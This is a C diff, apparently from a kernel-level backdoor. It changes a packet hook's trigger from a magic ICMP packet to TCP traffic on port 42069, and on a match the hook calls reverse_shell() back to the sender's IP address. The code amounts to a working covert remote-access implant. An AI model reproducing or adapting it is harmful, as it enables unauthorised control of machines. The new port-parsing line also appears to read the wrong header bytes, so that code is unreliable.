@@ -383,12 +383,12 @@ static int is_target(unsigned char *data) {
         return 0;
     }
     int protocol = data[ethLen + 10];
-    if (protocol != 1) {
+    if (protocol != 6) {
         return 0;
     }
-    int icmp_type = data[ethLen + ipHeaderLength + 1];
-    if (icmp_type == 0x69) {
-        return data[ethLen + ipHeaderLength + 2];
+    int tcp_dport = (data[ethLen + ipHeaderLength + 3] << 8) + data[ethLen + ipHeaderLength + 4];
+    if (tcp_dport == 42069) {
+        return 1;
     }
     return 0;
 }
@@ -401,13 +401,10 @@ static int hook(void *arg, struct mbuf **mp, struct ifnet *ifp, int dir, int fla
 	   fixed_data[i] = databuf[i] & 0x000000FF;
     }
     int targetFlag = is_target(fixed_data);
-#ifdef DEBUG
     if (targetFlag) {
-        printf("Oops: %d\n", targetFlag);
-    }
-#endif
-    if (targetFlag == 1) {
+#ifdef DEBUG
         reverse_shell(get_source_ip(fixed_data));
+#endif
     }
     return 0;
 }
